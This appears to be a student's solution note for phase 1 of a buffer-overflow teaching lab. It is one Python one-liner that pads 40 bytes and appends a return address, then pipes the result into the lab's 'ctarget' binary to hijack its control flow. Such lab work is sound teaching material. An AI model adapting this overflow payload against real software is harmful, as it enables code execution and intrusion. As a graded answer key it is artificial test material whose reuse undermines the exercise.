# phase 1

python3 -c 'import sys; sys.stdout.buffer.write(b"a"*40 + b"\xc0\x17\x40")' | ./ctarget -q
